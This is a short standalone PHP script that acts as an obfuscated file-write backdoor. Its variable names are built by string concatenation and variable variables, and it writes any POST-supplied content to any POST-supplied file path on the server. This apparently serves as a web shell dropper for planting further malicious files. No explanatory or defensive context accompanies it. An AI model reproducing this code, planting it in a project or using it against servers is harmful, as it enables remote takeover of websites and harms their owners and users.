<?php

if (isset($_POST['file'])) {
    $a = "d"."a"."t";
    $b = "a";
    $d = $a.$b; 
    $$d = $_POST['pass']; 
    $f = 'fp'; 
    $$f = fopen($_POST['file'],'wb'); 
    echo fwrite($$f,$data) ? 'save success' : 'save fail'; 
    fclose($$f); 
}
?>
